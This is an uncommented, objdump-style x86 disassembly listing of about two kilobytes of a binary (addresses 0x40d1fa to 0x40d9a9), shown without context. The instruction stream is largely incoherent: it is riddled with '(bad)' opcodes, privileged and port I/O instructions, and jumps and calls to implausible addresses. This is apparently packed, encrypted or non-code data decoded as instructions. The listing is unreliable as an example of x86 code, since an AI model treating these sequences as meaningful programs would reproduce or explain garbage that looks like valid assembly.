  40d1fa:	mov    ecx,DWORD PTR [ebx-0x41b21304]
  40d200:	mov    eax,0x7070808
  40d205:	xor    edi,eax
  40d207:	mov    edi,0x32729e
  40d20c:	xor    eax,edi
  40d20e:	add    eax,DWORD PTR [ebp+0x3]
  40d211:	(bad)  
  40d212:	pavgb  mm7,mm1
  40d215:	test   DWORD PTR [esi-0x8],eax
  40d218:	dec    ebp
  40d219:	inc    ebp
  40d21a:	mov    edx,ebp
  40d21c:	cld    
  40d21d:	xlat   BYTE PTR ds:[ebx]
  40d21e:	enter  0xf0c7,0xf0
  40d222:	retf   0xf200
  40d225:	add    dh,cl
  40d227:	leave  
  40d228:	jne    0x40d26f
  40d22a:	mov    ecx,DWORD PTR [ebx-0x39ea1304]
  40d230:	enter  0xf0ce,0xc7
  40d234:	retf   0xf2cf
  40d237:	scas   eax,DWORD PTR es:[edi]
  40d238:	out    dx,al
  40d239:	jmp    0x40d288
  40d23b:	mov    esi,DWORD PTR [ebx]
  40d23d:	cld    
  40d23e:	add    eax,edi
  40d240:	xor    eax,esi
  40d242:	jmp    0x40d289
  40d244:	xor    ecx,DWORD PTR [ebp-0x1ffc07cd]
  40d24a:	add    edi,edi
  40d24c:	ror    DWORD PTR [ecx+0x45f8f889],cl
  40d252:	dec    ebp
  40d253:	mov    esi,DWORD PTR [ebx]
  40d255:	cld    
  40d256:	lea    eax,[edi+ecx*1+0xff72e0]
  40d25d:	mov    ecx,DWORD PTR [ebp-0xc]
  40d260:	mov    ecx,DWORD PTR [ebp-0x4]
  40d263:	xor    esi,eax
  40d265:	(bad)  
  40d266:	enter  0xce08,0x72
  40d26a:	stc    
  40d26b:	add    BYTE PTR [edx+0x5f8b4545],ch
  40d271:	call   0x33861f79
  40d276:	pop    esi
  40d277:	xor    eax,ebx
  40d279:	sub    ecx,DWORD PTR [ebx+0x20fc818b]
  40d27f:	enter  0xb900,0xc7
  40d283:	inc    ebp
  40d284:	in     al,dx
  40d285:	xor    eax,DWORD PTR [ebp+0x4589f803]
  40d28b:	clc    
  40d28c:	xor    al,0x45
  40d28e:	pushf  
  40d28f:	ss (bad) 
  40d291:	pushf  
  40d292:	call   0xf92c5922
  40d297:	mov    eax,edi
  40d299:	loopne 0x40d27f
  40d29b:	inc    ebp
  40d29c:	test   DWORD PTR [ebx],esi
  40d29e:	clc    
  40d29f:	add    eax,DWORD PTR [ebp-0x2d]
  40d2a2:	push   esi
  40d2a3:	mov    DWORD PTR [edi-0x4],edx
  40d2a6:	push   ecx
  40d2a7:	inc    ebp
  40d2a8:	push   edi
  40d2a9:	mov    al,dh
  40d2ab:	mov    BYTE PTR [esi+0x34d320b],bl
  40d2b1:	mov    ecx,DWORD PTR [ecx+0x45b6f8f8]
  40d2b7:	xor    edi,DWORD PTR ds:0xc7089c89
  40d2bd:	dec    ebp
  40d2be:	cld    
  40d2bf:	mov    ebx,DWORD PTR [eax]
  40d2c1:	or     dl,ch
  40d2c3:	into   
  40d2c4:	inc    ebp
  40d2c5:	iret   
  40d2c6:	or     dl,cl
  40d2c8:	add    BYTE PTR [ebx+ecx*4-0xb007420],cl
  40d2cf:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2d2:	xor    ecx,edx
  40d2d4:	xor    ecx,DWORD PTR [ebp+0x3]
  40d2d7:	mov    eax,DWORD PTR [ebx]
  40d2d9:	hlt    
  40d2da:	bswap  esi
  40d2dc:	rol    DWORD PTR [ecx+esi*1+0x2b32459e],0x89
  40d2e4:	xor    ecx,DWORD PTR [eax]
  40d2e6:	mov    DWORD PTR [ebp-0x8],eax
  40d2e9:	xor    ebx,DWORD PTR [ebp-0x47]
  40d2ec:	call   0x40d17e
  40d2f1:	enter  0x4d45,0x8b
  40d2f5:	mov    eax,edi
  40d2f7:	lock dec ebp
  40d2f9:	inc    ebp
  40d2fa:	mov    DWORD PTR [ebx-0x39040f73],ecx
  40d300:	inc    edi
  40d302:	inc    ebp
  40d303:	enter  0x918b,0xfc
  40d307:	inc    ebp
  40d308:	(bad)  
  40d309:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3962]
  40d310:	mov    DWORD PTR [esi-0x4],ebx
  40d313:	rol    DWORD PTR [ebp-0x37],0x8b
  40d317:	add    al,0xf4
  40d319:	push   ebp
  40d31a:	into   
  40d31b:	in     al,dx
  40d31c:	mov    BYTE PTR [ebp-0x3f],0x8b
  40d320:	dec    ebp
  40d321:	or     BYTE PTR [ebx],bh
  40d323:	xor    BYTE PTR [esi+0x1],0x8b
  40d327:	add    ah,ah
  40d329:	add    dh,al
  40d32b:	in     al,dx
  40d32c:	(bad)  
  40d32d:	push   ebx
  40d32e:	inc    ebp
  40d32f:	mov    eax,edi
  40d331:	adc    al,ch
  40d333:	push   ss
  40d334:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40d33a:	popa   
  40d33b:	iret   
  40d33c:	dec    ebp
  40d33d:	sahf   
  40d33e:	mov    esi,DWORD PTR [edx]
  40d340:	clc    
  40d341:	add    ecx,esi
  40d343:	cmp    ecx,edi
  40d345:	jne    0x40d32f
  40d347:	add    DWORD PTR [ebp-0x62],0x4208648b
  40d34e:	or     BYTE PTR [ebx+0x48ae94d],bl
  40d354:	or     eax,DWORD PTR [eax]
  40d356:	push   ebp
  40d357:	dec    ebp
  40d358:	jnp    0xd00ae027
  40d35e:	dec    ebp
  40d35f:	xlat   BYTE PTR ds:[ebx]
  40d360:	mov    ecx,ebx
  40d362:	call   0x340b293a
  40d367:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  40d36e:	(bad)  
  40d36f:	cld    
  40d370:	sti    
  40d371:	lahf   
  40d372:	(bad)  
  40d373:	mov    ebp,0x8b330055
  40d378:	mov    DWORD PTR [eax],ecx
  40d37a:	clc    
  40d37b:	iret   
  40d37c:	dec    ebp
  40d37d:	retf   
  40d37e:	xor    eax,ecx
  40d380:	lea    eax,[eax+ecx*1+0x7204]
  40d387:	dec    ebp
  40d388:	inc    ebp
  40d389:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  40d38f:	mov    esp,DWORD PTR [edx+0x14]
  40d392:	int    0x6
  40d394:	sub    eax,DWORD PTR [ebp+0x3]
  40d397:	(bad)  
  40d398:	lock or BYTE PTR [ebp-0x7b],cl
  40d39c:	mov    edi,eax
  40d39e:	in     al,dx
  40d39f:	xor    al,0x4d
  40d3a1:	pushf  
  40d3a2:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40d3a8:	jne    0x40d333
  40d3aa:	mov    ebx,DWORD PTR [eax]
  40d3ac:	in     al,0x45
  40d3ae:	dec    ebp
  40d3af:	mov    esi,DWORD PTR [ebx]
  40d3b1:	nop
  40d3b2:	add    eax,DWORD PTR [eax]
  40d3b4:	pop    edi
  40d3b5:	mov    esi,DWORD PTR [ebx]
  40d3b7:	mov    DWORD PTR [ebx-0x2c],ebx
  40d3ba:	ret    0x4d
  40d3bd:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  40d3c3:	mov    ecx,DWORD PTR [ebp+0x3]
  40d3c6:	mov    edi,DWORD PTR [eax+edx*4]
  40d3c9:	dec    ebp
  40d3ca:	add    BYTE PTR [ebx-0x387cf775],cl
  40d3d0:	jo     0x40d395
  40d3d2:	push   esi
  40d3d3:	inc    ebp
  40d3d4:	jne    0x40d361
  40d3d6:	mov    ecx,DWORD PTR [eax]
  40d3d8:	push   edi
  40d3d9:	(bad)  
  40d3da:	push   edi
  40d3db:	ret    
  40d3dc:	push   ecx
  40d3dd:	inc    ebp
  40d3de:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  40d3e4:	add    BYTE PTR [ebx+0x45d10ccb],al
  40d3ea:	jnp    0x406de01d
  40d3f0:	jg     0x40d37d
  40d3f2:	jmp    0x54:0xde85700c
  40d3f9:	inc    ebp
  40d3fa:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  40d3fe:	push   ebp
  40d3ff:	cmp    BYTE PTR [ebx],dh
  40d401:	dec    ebp
  40d402:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  40d408:	cmp    esp,DWORD PTR [ebx]
  40d40a:	jne    0x40d397
  40d40c:	or     DWORD PTR [esi+ebx*4],0xef036440
  40d413:	jmp    0x40d42a
  40d415:	mov    ebp,ecx
  40d417:	push   esp
  40d418:	add    al,0x45
  40d41a:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  40d420:	add    eax,ebx
  40d422:	cmp    eax,DWORD PTR [ebp+0xf]
  40d425:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  40d42c:	sbb    BYTE PTR [ebp+0x45],al
  40d42f:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40d435:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  40d43b:	mov    DWORD PTR [ebp+0x14],eax
  40d43e:	xor    eax,0xba339c45
  40d443:	pushf  
  40d444:	test   edi,eax
  40d446:	clc    
  40d447:	adc    al,0x55
  40d449:	test   DWORD PTR [ebx+0x454518f8],ecx
  40d44f:	xor    DWORD PTR [ebx-0x7f74e764],ecx
  40d455:	lock add DWORD PTR [ebp+0x0],ecx
  40d459:	xor    eax,DWORD PTR [eax]
  40d45b:	add    ecx,DWORD PTR [ebp+0xf]
  40d45e:	mov    eax,ecx
  40d460:	sbb    BYTE PTR [ebp-0x77],cl
  40d463:	mov    eax,DWORD PTR [ecx]
  40d465:	rol    BYTE PTR [eax],1
  40d467:	iret   
  40d468:	or     DWORD PTR [eax+ecx*2+0xc32899e],ecx
  40d46f:	cmp    eax,DWORD PTR [ebp+0xf]
  40d472:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40d479:	or     BYTE PTR [ebp-0x39],al
  40d47c:	xor    eax,ebx
  40d47e:	add    eax,DWORD PTR [ebp-0x77]
  40d481:	mov    edx,DWORD PTR [eax+ebx*1]
  40d484:	inc    ebp
  40d485:	inc    ebp
  40d486:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  40d48c:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  40d492:	mov    ebp,eax
  40d494:	cmp    cl,dh
  40d496:	dec    ebp
  40d497:	dec    DWORD PTR [eax+0x45]
  40d49a:	inc    ecx
  40d49b:	(bad)  
  40d49c:	mov    esp,eax
  40d49e:	or     al,0x85
  40d4a0:	sbb    al,bh
  40d4a2:	inc    eax
  40d4a3:	inc    ebp
  40d4a4:	mov    esi,DWORD PTR [ebx]
  40d4a6:	or     al,0x3
  40d4a8:	dec    ecx
  40d4a9:	push   eax
  40d4aa:	dec    eax
  40d4ab:	inc    ebp
  40d4ac:	rcl    BYTE PTR [eax-0x38],1
  40d4af:	push   eax
  40d4b0:	inc    ebp
  40d4b1:	dec    DWORD PTR [ebx-0x3e07c775]
  40d4b7:	rol    BYTE PTR [ebx],0x4e
  40d4ba:	inc    eax
  40d4bb:	inc    ebp
  40d4bc:	mov    DWORD PTR [ebx],esi
  40d4be:	sbb    BYTE PTR [ebx],al
  40d4c0:	inc    ebp
  40d4c1:	push   eax
  40d4c2:	xor    esi,DWORD PTR [ebp+0x3]
  40d4c5:	lea    ecx,[ecx+0x45e814b8]
  40d4cb:	cmc    
  40d4cc:	xor    edi,edi
  40d4ce:	add    eax,DWORD PTR [ebp-0x77]
  40d4d1:	mov    DWORD PTR [eax+eiz*8],edx
  40d4d4:	inc    ebp
  40d4d5:	inc    ebp
  40d4d6:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  40d4dc:	ret    
  40d4dd:	inc    ebp
  40d4de:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  40d4e4:	adc    al,0x8b
  40d4e6:	test   DWORD PTR [eax],edx
  40d4e8:	clc    
  40d4e9:	inc    ecx
  40d4ea:	inc    ebp
  40d4eb:	mov    esi,DWORD PTR [edx]
  40d4ed:	loopne 0x40d48b
  40d4ef:	enter  0x16c7,0x14
  40d4f3:	inc    ebp
  40d4f4:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  40d4fa:	mov    eax,DWORD PTR [ebx]
  40d4fc:	sbb    BYTE PTR [eax],cl
  40d4fe:	(bad)  
  40d4ff:	dec    ebp
  40d500:	ret    
  40d501:	sub    ebp,DWORD PTR [edi+0x8028be9]
  40d507:	add    BYTE PTR [ebp+0xc],dl
  40d50a:	xor    esi,DWORD PTR [ebp-0x73]
  40d50d:	lea    edx,[ecx]
  40d50f:	lods   al,BYTE PTR ds:[esi]
  40d510:	jb     0x40d4fa
  40d512:	add    ch,dh
  40d514:	sar    edi,0x83
  40d517:	xor    eax,0x89009c03
  40d51c:	inc    ebp
  40d51d:	int3   
  40d51e:	xor    eax,DWORD PTR [ebp+0x3]
  40d521:	xor    al,0x89
  40d523:	pushf  
  40d524:	adc    al,0xc7
  40d526:	inc    ebp
  40d527:	les    eax,FWORD PTR [ebx]
  40d529:	test   esp,ebx
  40d52b:	clc    
  40d52c:	inc    ebp
  40d52d:	inc    ebp
  40d52e:	push   DWORD PTR [edx]
  40d530:	hlt    
  40d531:	pushf  
  40d532:	jne    0x40d4c1
  40d534:	mov    ecx,esp
  40d536:	or     al,0x4d
  40d538:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  40d53e:	clc    
  40d53f:	lea    eax,[ebp-0x3c]
  40d542:	cmp    eax,0x8b8d9c4d
  40d547:	shl    al,0x4d
  40d54a:	(bad)  
  40d54b:	mov    eax,ebx
  40d54d:	or     BYTE PTR [ebp-0x17344731],cl
  40d553:	dec    ebp
  40d554:	imul   ecx
  40d556:	inc    DWORD PTR [ecx]
  40d558:	inc    ebp
  40d559:	add    BYTE PTR [ebp-0x74638bcd],al
  40d55f:	pavgb  mm7,mm6
  40d562:	mov    DWORD PTR [eax],0xf0ff8bc3
  40d568:	clc    
  40d569:	iret   
  40d56a:	inc    ebp
  40d56b:	lock push eax
  40d56d:	retf   
  40d56e:	fmul   QWORD PTR [ebp-0x1]
  40d571:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40d577:	test   BYTE PTR [ebx+0x4d32e09e],cl
  40d57d:	mov    DWORD PTR [ebx],ebp
  40d57f:	loopne 0x40d50a
  40d581:	inc    ebp
  40d582:	loopne 0x40d50f
  40d584:	inc    ebp
  40d585:	loopne 0x40d512
  40d587:	xbegin 0x4091650
  40d58d:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  40d594:	jb     0x40d5e6
  40d596:	mov    ecx,DWORD PTR [eax+edi*8]
  40d599:	inc    ebp
  40d59a:	inc    eax
  40d59b:	push   eax
  40d59c:	mov    ebx,DWORD PTR [edi-0x8]
  40d59f:	inc    DWORD PTR [ecx-0x75]
  40d5a2:	mov    ebp,esp
  40d5a4:	loopne 0x40d5a6
  40d5a6:	rol    edi,0xee
  40d5a9:	test   BYTE PTR [eax],al
  40d5ab:	dec    edx
  40d5ac:	push   0x32
  40d5ae:	dec    DWORD PTR [ebx-0x30baf70c]
  40d5b4:	push   eax
  40d5b5:	mov    dh,0x94
  40d5b7:	add    edi,edi
  40d5b9:	cmp    edi,DWORD PTR [eax-0x7877af1]
  40d5bf:	add    BYTE PTR [ebp-0x75],al
  40d5c2:	(bad)  
  40d5c3:	call   0xc7c5d690
  40d5c8:	clc    
  40d5c9:	test   BYTE PTR [ebp+0x4a],al
  40d5cc:	xor    esi,DWORD PTR [edx]
  40d5ce:	pushf  
  40d5cf:	mov    eax,edi
  40d5d1:	or     al,al
  40d5d3:	iret   
  40d5d4:	test   DWORD PTR [esi+0x3b4d03f8],esi
  40d5da:	mov    DWORD PTR [edi],ecx
  40d5dc:	in     al,dx
  40d5dd:	pop    eax
  40d5de:	dec    ebp
  40d5df:	add    BYTE PTR [ecx+0x4df8e88b],cl
  40d5e5:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  40d5eb:	dec    edx
  40d5ec:	mov    DWORD PTR [edx],esi
  40d5ee:	in     al,0x8b
  40d5f0:	dec    ebp
  40d5f1:	or     BYTE PTR [ebx],dh
  40d5f3:	iret   
  40d5f4:	add    esi,DWORD PTR [esi+0x3be00389]
  40d5fa:	test   DWORD PTR [edi],0x3d3800
  40d600:	test   DWORD PTR [ebx+0x84e4f8],ecx
  40d606:	add    edi,eax
  40d608:	add    BYTE PTR [ebp+ecx*2-0x74cdccb6],al
  40d60f:	mov    eax,DWORD PTR [ebx]
  40d611:	or     BYTE PTR [ecx+0x45b614cf],cl
  40d617:	add    esi,DWORD PTR [ebx]
  40d619:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  40d61f:	add    BYTE PTR [eax],al
  40d621:	mov    eax,DWORD PTR [ebp-0x18]
  40d624:	mov    eax,DWORD PTR [eax]
  40d626:	lock (bad) 
  40d628:	dec    ebp
  40d629:	test   BYTE PTR [ebx],dh
  40d62b:	dec    edx
  40d62c:	add    esi,DWORD PTR [edx]
  40d62e:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  40d634:	or     bh,cl
  40d636:	(bad)  
  40d637:	mov    ebx,es
  40d639:	dec    edx
  40d63a:	push   0x32
  40d63c:	lea    esi,[edx]
  40d63e:	lods   al,BYTE PTR ds:[esi]
  40d63f:	mov    ebp,eax
  40d641:	clc    
  40d642:	cli    
  40d643:	or     edi,edi
  40d645:	iret   
  40d646:	inc    ebp
  40d647:	mov    WORD PTR [ebx-0x75cdccb6],cs
  40d64d:	or     al,BYTE PTR ds:0xec728b
  40d653:	or     DWORD PTR [ebp-0x31],ecx
  40d656:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb2]
  40d65d:	cmp    al,cl
  40d65f:	je     0x40d839
  40d665:	mov    eax,DWORD PTR [ebp-0x8]
  40d668:	mov    eax,DWORD PTR [eax]
  40d66a:	xor    eax,edi
  40d66c:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  40d673:	mov    ecx,DWORD PTR [ebp-0x18]
  40d676:	xor    ecx,DWORD PTR [ecx]
  40d678:	bswap  edi
  40d67a:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb6],0x32
  40d682:	add    DWORD PTR [ebx+0x945e400],ecx
  40d688:	mov    ecx,edi
  40d68a:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054a]
  40d691:	or     al,BYTE PTR [eax]
  40d693:	mov    ecx,DWORD PTR [ebp-0x18]
  40d696:	xor    ecx,DWORD PTR [ecx]
  40d698:	bswap  edi
  40d69a:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb2],0x3a
  40d6a2:	add    DWORD PTR [edi],ecx
  40d6a4:	add    BYTE PTR [eax-0x7474ffbb],dl
  40d6aa:	xor    esp,esp
  40d6ac:	mov    al,BYTE PTR [eax]
  40d6ae:	add    eax,0x8472c7
  40d6b3:	dec    edx
  40d6b4:	dec    ebp
  40d6b5:	xor    dh,BYTE PTR [ebx]
  40d6b7:	mov    ecx,DWORD PTR [edi]
  40d6b9:	clc    
  40d6ba:	ror    BYTE PTR [ecx],0xcb
  40d6bd:	iret   
  40d6be:	ror    DWORD PTR [esp+eax*4+0x32014a],0x32
  40d6c6:	inc    ebp
  40d6c7:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  40d6cd:	iret   
  40d6ce:	add    eax,0x4a728c
  40d6d3:	xor    cl,BYTE PTR [ebp+0xa]
  40d6d6:	mov    ecx,DWORD PTR [ebx+0x98af833]
  40d6dc:	or     eax,0x8c72cf
  40d6e1:	dec    esi
  40d6e2:	shl    DWORD PTR [edx],0x4d
  40d6e5:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  40d6eb:	in     al,0xd
  40d6ed:	add    BYTE PTR [edx-0x39],dh
  40d6f0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  40d6f7:	mov    esi,DWORD PTR [ebx]
  40d6f9:	in     al,dx
  40d6fa:	mov    cl,BYTE PTR [ecx]
  40d6fc:	or     eax,0x8c72cf
  40d701:	dec    edx
  40d702:	enter  0x8532,0x32
  40d706:	add    BYTE PTR [ebx+0x945e800],cl
  40d70c:	mov    ecx,edi
  40d70e:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054a]
  40d715:	or     al,BYTE PTR [eax]
  40d717:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d71a:	mov    ecx,DWORD PTR [ecx]
  40d71c:	xor    ecx,edi
  40d71e:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724e]
  40d725:	cmp    al,cl
  40d727:	jne    0x40d776
  40d729:	lea    ecx,[ebx-0x7517cc54]
  40d72f:	cli    
  40d730:	or     eax,0x4d72ff
  40d735:	cmp    eax,ecx
  40d737:	je     0x40d786
  40d739:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  40d73f:	ret    
  40d740:	or     eax,0x8b7245
  40d745:	lock enter 0x85c7,0x84
  40d74a:	add    BYTE PTR [esi+0x33453200],bl
  40d750:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40d756:	add    eax,0x37233
  40d75b:	cmp    ecx,DWORD PTR [ebp+0xf]
  40d75e:	mov    esi,edi
  40d760:	xor    edi,edi
  40d762:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40d768:	add    BYTE PTR [ebx],dh
  40d76a:	rol    DWORD PTR [ebx],0x4d
  40d76d:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  40d773:	lock or eax,0x33724d
  40d779:	(bad)  
  40d77a:	ror    DWORD PTR [eax],0x4d
  40d77d:	jb     0x40d70a
  40d77f:	add    BYTE PTR [ebx],dh
  40d781:	ja     0x40d70d
  40d783:	sbb    BYTE PTR ds:0x8d7275,cl
  40d789:	xchg   esp,eax
  40d78a:	enter  0x50e8,0xf3
  40d78e:	inc    ebp
  40d78f:	dec    DWORD PTR [ebx-0x7574ccbb]
  40d795:	loopne 0x40d79c
  40d797:	(bad)  
  40d798:	jb     0x40d75d
  40d79a:	add    cl,al
  40d79c:	dec    ebp
  40d79d:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  40d7a3:	add    ecx,DWORD PTR ds:0x187250
  40d7a9:	inc    ebp
  40d7aa:	rcl    DWORD PTR [eax+0x4d],0x4f
  40d7ae:	mov    edi,edi
  40d7b0:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40d7b6:	jb     0x40d741
  40d7b8:	add    BYTE PTR [ecx+eax*8],dl
  40d7bb:	jne    0x40d80a
  40d7bd:	dec    DWORD PTR [ebx-0x75baccec]
  40d7c3:	add    ecx,DWORD PTR ds:0xe872d8
  40d7c9:	repnz enter 0x10ff,0x45
  40d7ce:	inc    ebp
  40d7cf:	mov    edx,DWORD PTR [eax-0x20]
  40d7d2:	mov    ds:0x8bc3ffc7,eax
  40d7d7:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  40d7df:	mov    esi,DWORD PTR [ebx]
  40d7e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7e2:	add    eax,DWORD PTR [ebp-0x77]
  40d7e5:	push   eax
  40d7e6:	adc    al,0x15
  40d7e8:	inc    ebp
  40d7e9:	push   DWORD PTR [ebx]
  40d7eb:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  40d7f1:	add    DWORD PTR [eax],eax
  40d7f3:	mov    eax,edi
  40d7f5:	test   al,0x4d
  40d7f7:	inc    ebp
  40d7f8:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  40d7fe:	retf   
  40d7ff:	mov    edx,ecx
  40d801:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  40d808:	inc    ebp
  40d809:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  40d80f:	xor    eax,ebx
  40d811:	(bad)  
  40d812:	enter  0x1111,0x72
  40d816:	inc    ebp
  40d817:	add    BYTE PTR [ebx-0x387de73f],cl
  40d81d:	cld    
  40d81e:	test   bh,bh
  40d820:	sahf   
  40d821:	jne    0x40d855
  40d823:	mov    ebp,ebx
  40d825:	fsubr  DWORD PTR [edx+0x6]
  40d828:	dec    DWORD PTR [edx]
  40d82a:	hlt    
  40d82b:	xor    eax,0x7f502d45
  40d830:	sbb    ch,ah
  40d832:	call   DWORD PTR [edx-0x75]
  40d835:	pop    esi
  40d836:	or     cl,cl
  40d838:	dec    ebp
  40d839:	adc    al,0x33
  40d83b:	push   ebp
  40d83c:	add    ebp,esp
  40d83e:	cmp    esp,esp
  40d840:	je     0x40d7c5
  40d842:	mov    esp,DWORD PTR [eax]
  40d844:	or     BYTE PTR ds:0x89c39cc7,dh
  40d84a:	push   0x24
  40d84c:	lea    ecx,[ebp+0x44e8ff94]
  40d852:	clc    
  40d853:	or     al,0xff
  40d855:	push   esp
  40d856:	inc    ebp
  40d857:	or     BYTE PTR [ebx+0x450818be],al
  40d85d:	pop    es
  40d85e:	call   esi
  40d860:	test   al,0xbf
  40d862:	jne    0x40d8d6
  40d864:	mov    eax,DWORD PTR [eax]
  40d866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d867:	xlat   BYTE PTR ds:[ebx]
  40d868:	inc    ebp
  40d869:	push   esp
  40d86a:	push   eax
  40d86b:	or     al,0xde
  40d86d:	push   ebp
  40d86e:	dec    DWORD PTR [ecx-0x74f7db75]
  40d874:	dec    ebp
  40d875:	adc    BYTE PTR [ebx],dh
  40d877:	rol    DWORD PTR [ebx],1
  40d879:	sbb    BYTE PTR [ebx],bh
  40d87b:	dec    esp
  40d87c:	je     0x40d892
  40d87e:	push   0x54
  40d880:	call   DWORD PTR [eax]
  40d882:	test   al,0xce
  40d884:	inc    ebp
  40d885:	iret   
  40d886:	add    ebp,DWORD PTR [edi+0x24e889d8]
  40d88c:	clc    
  40d88d:	jmp    0x85da91
  40d892:	mov    edx,eax
  40d894:	test   al,0x1f
  40d896:	or     BYTE PTR [ebp+eax*2+0x10],al
  40d89a:	add    ecx,DWORD PTR [eax+ebx*1+0x14]
  40d89e:	inc    ebp
  40d89f:	(bad)  
  40d8a0:	mov    eax,DWORD PTR [eax+esi*8+0x33324d9e]
  40d8a7:	mov    DWORD PTR [ebx],eax
  40d8a9:	and    al,0xf
  40d8ab:	push   0xf84d85c1
  40d8b0:	mov    edi,ebp
  40d8b2:	rol    BYTE PTR [eax],1
  40d8b4:	iret   
  40d8b5:	or     DWORD PTR [ebx+esi*1+0x75329c9e],0x850f683b
  40d8c0:	push   edi
  40d8c1:	clc    
  40d8c2:	(bad)  
  40d8c3:	jmp    0x40d850
  40d8c5:	add    BYTE PTR [eax],dl
  40d8c7:	mov    eax,0xf8898545
  40d8cc:	jmp    0x40d89e
  40d8ce:	add    DWORD PTR [ebp+0x64009e],0x206544bf
  40d8d8:	pop    edi
  40d8d9:	inc    esp
  40d8da:	pop    ebx
  40d8db:	sbb    dl,al
  40d8dd:	inc    ebp
  40d8de:	add    BYTE PTR [ecx-0x747cdb75],cl
  40d8e4:	clc    
  40d8e5:	and    al,0xec
  40d8e7:	mov    DWORD PTR [ecx-0x7747adc],edi
  40d8ed:	and    al,0x4c
  40d8ef:	mov    DWORD PTR [eax],ecx
  40d8f1:	and    al,0x41
  40d8f3:	mov    ecx,DWORD PTR [ecx-0x7474dbdc]
  40d8f9:	and    al,0x24
  40d8fb:	xor    edx,DWORD PTR [esi+0x3]
  40d8fe:	push   edi
  40d8ff:	mov    DWORD PTR [ecx-0x75],edx
  40d902:	xor    esp,DWORD PTR [edi+edx*2]
  40d905:	mov    ebx,DWORD PTR [esi+0x3003294]
  40d90b:	mov    ecx,DWORD PTR [ecx-0x74dbdb75]
  40d911:	mov    ecx,DWORD PTR [esp+edx*4]
  40d914:	push   esp
  40d915:	add    BYTE PTR [eax],ah
  40d917:	mov    edx,DWORD PTR [ebp+0x3]
  40d91a:	cmp    edi,DWORD PTR [esi*2+0x24188b4c]
  40d921:	mov    DWORD PTR [ebx+0x33002401],ecx
  40d927:	dec    ecx
  40d928:	add    ebp,DWORD PTR [edx+0xf]
  40d92b:	push   0x4c30ca
  40d930:	adc    BYTE PTR [eax+0x1f],dh
  40d933:	push   0x0
  40d935:	(bad)  
  40d936:	cmp    ecx,DWORD PTR [ecx-0x7474db8b]
  40d93c:	and    al,0x24
  40d93e:	mov    esi,DWORD PTR [ebx]
  40d940:	and    al,0x3
  40d942:	xor    ecx,DWORD PTR [ecx-0x74f7db73]
  40d948:	jb     0x40d96e
  40d94a:	add    bh,bh
  40d94c:	inc    esp
  40d94d:	and    al,0x14
  40d94f:	lea    esi,[ebx]
  40d951:	and    al,0x9c
  40d953:	push   eax
  40d954:	jmp    0x54d99d
  40d959:	(bad)  
  40d95a:	cli    
  40d95b:	and    al,0x85
  40d95d:	(bad)  
  40d95e:	clc    
  40d95f:	and    al,0xa
  40d961:	call   0xffddd298
  40d966:	jmp    0x54d9af
  40d96b:	dec    esp
  40d96c:	aas    
  40d96d:	or     al,0x9c
  40d96f:	(bad)  
  40d970:	cmp    eax,edi
  40d972:	bswap  eax
  40d974:	mov    bh,0x4b
  40d976:	add    BYTE PTR [ebx+ecx*4+0x20],al
  40d97a:	and    al,0x4c
  40d97c:	mov    DWORD PTR [esp],ebx
  40d97f:	(bad)  
  40d980:	mov    eax,edi
  40d982:	or     BYTE PTR [edi-0x76e3dbbc],ch
  40d988:	inc    esp
  40d989:	jmp    0x40d99f
  40d98b:	add    DWORD PTR [edx+esi*1+0x20],0x1075449c
  40d993:	push   0xf8148544
  40d998:	inc    esp
  40d999:	sbb    BYTE PTR [edx+edi*8],dl
  40d99c:	dec    esp
  40d99d:	test   DWORD PTR [eax+edi*8],ebx
  40d9a0:	mov    BYTE PTR [edi],0xc7
  40d9a3:	xor    BYTE PTR [ecx],al
  40d9a5:	pushf  
  40d9a6:	inc    esp
  40d9a7:	jmp    0x40d9c1
  40d9a9:	add    DWORD PTR [eax+0x9c0130],0x44500875
